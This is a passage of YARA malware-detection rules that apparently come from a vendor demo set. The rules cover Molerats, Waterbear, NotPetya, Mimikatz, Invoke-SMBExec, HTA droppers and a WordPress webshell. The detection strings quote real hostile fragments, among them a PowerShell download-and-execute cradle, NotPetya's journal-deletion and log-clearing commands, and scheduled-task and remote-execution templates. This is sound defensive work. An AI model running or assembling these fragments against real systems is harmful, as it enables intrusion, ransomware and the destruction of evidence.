      $s1 = "ezExODA0Y2U0LTkzMGEtNGIwOS1iZjcwLTlmMWE5NWQwZDcwZH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{c00" wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule Molerats_Jul17_Sample_2_RID2F9C : APT DEMO EXE FILE G0021 T1136 {
   meta:
      description = "Detects Molerats sample - July 2017"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07 12:04:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Folder.exe" fullword ascii
      $s2 = "Notepad++.exe" fullword wide
      $s3 = "RSJLRSJOMSJ" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule Molerats_Jul17_Sample_3_RID2F9D : APT DEMO EXE FILE G0021 T1136 {
   meta:
      description = "Detects Molerats sample - July 2017"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07 12:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ccleaner.exe" fullword wide
      $s2 = "Folder.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )
} 

rule Molerats_Jul17_Sample_4_RID2F9E : APT DEMO G0021 T1136 {
   meta:
      description = "Detects Molerats sample - July 2017"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07 12:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "get-itemproperty -path 'HKCU:\\SOFTWARE\\Microsoft\\' -name 'KeyName')" wide
      $x2 = "O.Run C & chrw(34) & \"[System.IO.File]::" wide
      $x3 = "HKCU\\SOFTWARE\\Microsoft\\\\KeyName\"" fullword wide
   condition: 
      ( filesize < 700KB and 1 of them )
} 

rule Molerats_Jul17_Sample_5_RID2F9F : APT DEMO G0021 T1105 T1136 {
   meta:
      description = "Detects Molerats sample - July 2017"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07 12:05:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0021, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "powershell.exe -nop -c \"iex" nocase ascii
      $x2 = ".run('%windir%\\\\SysWOW64\\\\WindowsPowerShell\\\\" ascii
      $a1 = "Net.WebClient).DownloadString" nocase ascii
      $a2 = "gist.githubusercontent.com" nocase ascii
   condition: 
      filesize < 200KB and ( 1 of ( $x* ) or 2 of them )
} 

rule Molerats_Jul17_Sample_Dropper_RID3246 : APT DEMO EXE FILE G0021 MAL T1136 {
   meta:
      description = "Detects Molerats sample dropper SFX - July 2017"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07 13:58:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0021, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Please remove %s from %s folder. It is unsecure to run %s until it is done." fullword wide
      $s2 = "sfxrar.exe" fullword ascii
      $s3 = "attachment.hta" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule Disclosed_0day_POCs_lpe_RID2FCC : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "msiexec /f c:\\users\\%username%\\downloads\\" fullword ascii
      $x2 = "c:\\users\\%username%\\downloads\\bat.bat" fullword ascii
      $x3 = "\\payload.msi /quiet" ascii
      $x4 = "\\payload2\\WindowsTrustedRTProxy.sys" fullword wide
      $x5 = "\\payload2" fullword wide
      $x6 = "\\payload" fullword wide
      $x7 = "WindowsTrustedRTProxy.sys /grant:r administrators:RX" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 70KB and 1 of them )
} 

rule Disclosed_0day_POCs_InjectDll_RID3204 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 13:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\InjectDll.pdb" fullword ascii
      $x2 = "Specify -l to list all IE processes running in the current session" fullword ascii
      $x3 = "Usage: InjectDll -l|pid PathToDll" fullword ascii
      $x4 = "Injecting DLL: %ls into PID: %d" fullword ascii
      $x5 = "Error adjusting privilege %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule Disclosed_0day_POCs_payload_MSI_RID32BD : DEMO FILE HKTL T1136 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 14:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WShell32.dll" fullword wide
      $s2 = "Target empty, so account name translation begins on the local system." fullword wide
      $s3 = "\\custact\\x86\\AICustAct.pdb" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 1000KB and all of them )
} 

rule Disclosed_0day_POCs_injector_RID31E9 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 13:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\injector.pdb" ascii
      $x2 = "Cannot write the shellcode in the process memory, error: " fullword ascii
      $x3 = "/s shellcode_file PID: shellcode injection." fullword ascii
      $x4 = "/d dll_file PID: dll injection via LoadLibrary()." fullword ascii
      $x5 = "/s shellcode_file PID" fullword ascii
      $x6 = "Shellcode copied in memory: OK" fullword ascii
      $x7 = "Usage of the injector. " fullword ascii
      $x8 = "KO: cannot obtain the SeDebug privilege." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them ) or 3 of them
} 

rule Disclosed_0day_POCs_lpe_2_RID305D : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 12:36:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\cmd.exe\" /k wusa c:\\users\\" ascii
      $s2 = "D:\\gitpoc\\UAC\\src\\x64\\Release\\lpe.pdb" fullword ascii
      $s3 = "Folder Created: " fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them )
} 

rule TeleDoor_Backdoor_RID2DB3 : DEMO EXE FILE MAL {
   meta:
      description = "Detects the TeleDoor Backdoor as used in Petya Attack in June 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/CpfJQQ"
      date = "2017-07-05 10:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "1.7"
      
   strings:
      $c1 = { 50 61 79 6C 6F 61 64 00 41 75 74 6F 50 61 79 6C 6F 61 64 } 
      $c2 = { 52 75 6E 43 6D 64 00 44 75 6D 70 44 61 74 61 } 
      $c3 = { 00 5A 76 69 74 57 65 62 43 6C 69 65 6E 74 45 78 74 00 4D 69 6E 49 6E 66 6F } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 2 of them )
} 

rule Andromeda_MalBot_Jun_1A_RID2F97 : DEMO EXE FILE MAL T1060 T1136 {
   meta:
      description = "Detects a malicious Worm Andromeda / RETADUP"
      author = "Florian Roth"
      reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/information-stealer-found-hitting-israeli-hospitals/"
      date = "2017-06-30 12:03:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1060, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%temp%\\FolderN\\name.exe" fullword wide
      $x2 = "%temp%\\FolderN\\name.exe.lnk" fullword wide
      $x3 = "\\Startup\\name.exe" fullword wide
      $x4 = "firefox.exe.exe" fullword wide
      $x5 = "\\Desktop\\New folder\\dark.exe" fullword wide
      $x6 = "\\x86\\Release\\word.pdb" fullword ascii
      $x7 = "\\obj\\Release\\botkill.pdb" fullword ascii
      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii
      $s2 = "svhost.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 2 of them )
} 

rule NotPetya_Ransomware_Jun17_RID30B7 : CRIME DEMO EXE FILE MAL T1047 T1053 T1085 T1136 {
   meta:
      description = "Detects new NotPetya Ransomware variant from June 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/h6iaGj"
      date = "2017-06-27 12:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CRIME, DEMO, EXE, FILE, MAL, T1047, T1053, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Ooops, your important files are encrypted." fullword wide ascii
      $x2 = "process call create \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\%s\\\" #1 " fullword wide
      $x3 = "-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 " fullword wide
      $x4 = "Send your Bitcoin wallet ID and personal installation key to e-mail " fullword wide
      $x5 = "fsutil usn deletejournal /D %c:" fullword wide
      $x6 = "wevtutil cl Setup & wevtutil cl System" ascii
      $x7 = { 2C 00 23 00 31 00 20 00 00 00 00 00 00 00 00 00 72 00 75 00 6E
         00 64 00 6C 00 6C 00 33 00 32 00 2E 00 65 00 78 00 65 00 } 
      $s1 = "%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\" " fullword wide
      $s4 = "\\\\.\\pipe\\%ws" fullword wide
      $s5 = "schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d" fullword wide
      $s6 = "u%s \\\\%s -accepteula -s " fullword wide
      $s7 = "dllhost.dat" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 3 of them )
} 

rule PowerShell_in_Word_Doc_RID2FBC : DEMO FILE MAL OFFICE SCRIPT T1086 T1136 {
   meta:
      description = "Detects a powershell and bypass keyword in a Word document"
      author = "Florian Roth"
      reference = "Internal Research - ME"
      date = "2017-06-27 12:09:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, OFFICE, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "POwErSHELl.ExE" fullword ascii nocase
      $s2 = "BYPASS" fullword ascii nocase
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 1000KB and all of them )
} 

rule Wordpress_Config_Webshell_Preprend_RID34C3 : DEMO FILE T1076 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-06-25 15:44:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1076, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = " * @package WordPress" fullword ascii
      $s1 = "define('DB_NAME'," ascii
      $s2 = "require_once(ABSPATH . 'wp-settings.php');" ascii
      $fp1 = "iThemes Security Config" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and filesize < 400KB and $x1 and all of ( $s* ) and not $x1 in ( 0 .. 1000 ) and not 1 of ( $fp* )
} 

rule Waterbear_1_Jun17_RID2D32 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:21:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Release\\svc.pdb" ascii
      $s2 = "svc.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule Waterbear_6_Jun17_RID2D37 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:22:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "svcdll.dll" fullword ascii
      $s2 = "log.log" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )
} 

rule Waterbear_10_Jun17_RID2D62 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ADVPACK32.DLL" fullword wide
      $s5 = "ADVPACK32" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )
} 

rule Waterbear_12_Jun17_RID2D64 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "O_PROXY" fullword ascii
      $s2 = "XMODIFY" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule Waterbear_14_Jun17_RID2D66 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:30:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "my.com/msg/util/sgthash" fullword ascii
      $s2 = "C:\\recycled" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and all of them )
} 

rule Waterbear_2_Jun17_RID2D33 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "downloading movie" fullword ascii
      $s2 = "name=\"test.exe\"/>" fullword ascii
      $s3 = "<description>Test Application</description>" fullword ascii
      $s4 = "UI look 2003" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule Waterbear_4_Jun17_RID2D35 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:22:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)" fullword ascii
      $s1 = "Wininet.dll InternetOpenA InternetConnectA HttpOpenRequestA HttpSendRequestA HttpQueryInfoA InternetReadFile InternetCloseHandle" fullword ascii
      $s2 = "read from pipe:%s" fullword ascii
      $s3 = "delete pipe" fullword ascii
      $s4 = "cmdcommand:%s" fullword ascii
      $s5 = "%s /c del %s" fullword ascii
      $s6 = "10.0.0.250" fullword ascii
      $s7 = "Vista/2008" fullword ascii
      $s8 = "%02X%02X%02X%02X%02X%02X%04X" fullword ascii
      $s9 = "UNKOWN" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )
} 

rule Waterbear_5_Jun17_RID2D36 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "ICESWORD" fullword ascii
      $a2 = "klog.dat" fullword ascii
      $s1 = "\\cswbse.dll" fullword ascii
      $s2 = "WIRESHARK" fullword ascii
      $s3 = "default_zz|" fullword ascii
      $s4 = "%c4%u-%.2u-%.2u %.2u:%.2u" fullword ascii
      $s5 = "1111%c%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3d53 and filesize < 100KB and ( all of ( $a* ) or 3 of them ) )
} 

rule Waterbear_7_Jun17_RID2D38 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:22:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Bluthmon.exe" fullword wide
      $s2 = "Motomon.exe" fullword wide
      $s3 = "%d.%s%d%d%d" fullword ascii
      $s4 = "mywishes.hlp" fullword ascii
      $s5 = "filemon.rtf" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
} 

rule Waterbear_8_Jun17_RID2D39 : DEMO EXE FILE MAL T1050 T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Update.dll" fullword ascii
      $s2 = "ADVPACK32.DLL" fullword wide
      $s3 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" fullword ascii
      $s4 = "\\drivers\\sftst.sys" fullword ascii
      $s5 = "\\\\.\\SFilter" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )
} 

rule Waterbear_9_Jun17_RID2D3A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ADVPACK32.DLL" fullword wide
      $s2 = "ADVPACK32" fullword wide
      $a1 = "U2_Dll.dll" fullword ascii
      $b1 = "ProUpdate" fullword ascii
      $b2 = "Update.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of ( $s* ) and ( $a1 or all of ( $b* ) )
} 

rule Waterbear_11_Jun17_RID2D63 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/Pages/%u.asp" fullword wide
      $s2 = "NVIDIA Corporation." fullword wide
      $s3 = "tqxbLc|fP_{eOY{eOX{eO" fullword ascii
      $s4 = "Copyright (C) 2005" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule Waterbear_13_Jun17_RID2D65 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://goo.gl/L9g9eR"
      date = "2017-06-23 10:30:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%WINDIR%\\PCHealth\\HelpCtr\\Binaries\\pchsvc.dll" fullword ascii
      $s2 = "brnew.exe" fullword ascii
      $s3 = "ChangeServiceConfig failed (%d)" fullword ascii
      $s4 = "Proxy %d:%s %d" fullword ascii
      $s5 = "win9807.tmp" fullword ascii
      $s7 = "Service stopped successfully" fullword ascii
      $s8 = "current dns:%s" fullword ascii
      $s9 = "%c%u|%u|%u|%u|%u|" fullword ascii
      $s10 = "[-]send %d: " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them )
} 

rule PowerShell_ISESteroids_Obfuscation_RID347F : DEMO OBFUS SCRIPT T1027 T1064 T1086 T1136 {
   meta:
      description = "Detects PowerShell ISESteroids obfuscation"
      author = "Florian Roth"
      reference = "https://twitter.com/danielhbohannon/status/877953970437844993"
      date = "2017-06-23 15:33:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, OBFUS, SCRIPT, T1027, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/\\/===\\__" ascii
      $x2 = "${__/\\/==" ascii
      $x3 = "Catch { }" fullword ascii
      $x4 = "\\_/=} ${_" ascii
   condition: 
      2 of them
} 

rule CN_Actor_AmmyyAdmin_RID2E4F : CHINA DEMO EXE FILE MAL T1072 T1136 T1219 {
   meta:
      description = "Detects Ammyy Admin Downloader"
      author = "Florian Roth"
      reference = "Internal Research - CN Actor"
      date = "2017-06-22 11:09:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1072, T1136, T1219"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "\\Ammyy\\sources\\main\\Downloader.cpp" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule BTC_Miner_lsass1_chrome_2_RID3068 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects a Bitcoin Miner"
      author = "Florian Roth"
      reference = "Internal Research - CN Actor"
      date = "2017-06-22 12:38:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $x2 = "-O, --userpass=U:P    username:password pair for mining server" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 1 of them )
} 

rule CN_Actor_RA_Tool_Ammyy_mscorsvw_RID3338 : CHINA DEMO EXE FILE MAL T1072 T1136 T1219 {
   meta:
      description = "Detects Ammyy remote access tool"
      author = "Florian Roth"
      reference = "Internal Research - CN Actor"
      date = "2017-06-22 14:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1072, T1136, T1219"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Please enter password for accessing remote computer" fullword ascii
      $s2 = "Die Zugriffsanforderung wurde vom Remotecomputer abgelehnt" fullword ascii
      $s3 = "It will automatically be run the next time this computer is restart or you can start it manually" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )
} 

rule HTA_with_WScript_Shell_RID2F8B : DEMO SUSP T1136 {
   meta:
      description = "Detects WScript Shell in HTA"
      author = "Florian Roth"
      reference = "https://twitter.com/msftmmpc/status/877396932758560768"
      date = "2017-06-21 12:01:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<hta:application windowstate=\"minimize\"/>" 
      $s2 = "<script>var b=new ActiveXObject(\"WScript.Shell\");" ascii
   condition: 
      all of them
} 

rule HTA_Embedded_RID2B57 : DEMO SUSP T1136 {
   meta:
      description = "Detects an embedded HTA file"
      author = "Florian Roth"
      reference = "https://twitter.com/msftmmpc/status/877396932758560768"
      date = "2017-06-21 09:02:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<hta:application windowstate=\"minimize\"/>" 
   condition: 
      $s1 and not $s1 in ( 0 .. 50000 )
} 

rule Mimikatz_Gen_Strings_RID2F19 : DEMO EXE FILE GEN HKTL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Detects Mimikatz by using some special strings"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-06-19 11:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, HKTL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[*] '%s' service already started" fullword wide
      $s2 = "** Security Callback! **" fullword wide
      $s3 = "Try to export a software CA to a crypto (virtual)hardware" fullword wide
      $s4 = "enterpriseadmin" fullword wide
      $s5 = "Ask debug privilege" fullword wide
      $s6 = "Injected =)" fullword wide
      $s7 = "** SAM ACCOUNT **" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )
} 

rule Invoke_SMBExec_RID2C43 : DEMO SCRIPT T1064 T1136 {
   meta:
      description = "Detects Invoke-WmiExec or Invoke-SmbExec"
      author = "Florian Roth"
      reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
      date = "2017-06-14 09:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Invoke-SMBExec -Target" fullword ascii
      $x2 = "$packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID" fullword ascii
      $s1 = "Write-Output \"Command executed with service $SMB_service on $Target\"" fullword ascii
      $s2 = "$packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00" fullword ascii
      $s3 = "$SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \\svcctl" fullword ascii
   condition: 
      ( filesize < 400KB and 1 of them )
} 

